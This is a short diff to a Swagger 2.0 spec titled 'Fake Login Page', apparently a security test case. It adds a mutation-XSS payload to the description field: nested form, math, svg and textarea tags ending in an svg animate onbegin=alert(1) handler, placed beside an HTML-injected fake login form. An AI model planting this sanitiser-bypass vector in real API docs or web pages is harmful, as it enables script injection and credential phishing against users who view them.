@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
 version: 1.0.0
 title: Fake Login Page
-description: '<div class=" login-form">
+description: '<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><svg><animate onbegin=alert(1) attributeName=x dur=1s>"></form><div class=" login-form">
 		<div class="heading">
 			<h1>HTML Injection: Fake Login</h1>
 		</div>
@@ -23,8 +23,8 @@ description: '<div class=" login-form">
 		</div>
 </div>'
 paths:
-	/:
-		 post:
-			responses:
-				' 200':
-					description: Login successful
+/:
+ post:
+	responses:
+	'200':
+	description: Login successful
